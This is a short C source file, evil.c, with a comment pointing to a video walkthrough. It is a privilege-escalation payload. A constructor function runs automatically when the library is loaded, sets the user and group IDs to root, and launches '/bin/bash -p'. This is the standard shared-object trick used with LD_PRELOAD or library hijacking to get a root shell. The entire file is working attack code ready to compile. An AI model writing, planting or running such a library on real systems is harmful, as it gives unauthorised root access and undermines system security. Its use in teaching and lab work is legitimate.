// YouTube video walk through: https://youtu.be/k6-5rF1tz_U
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
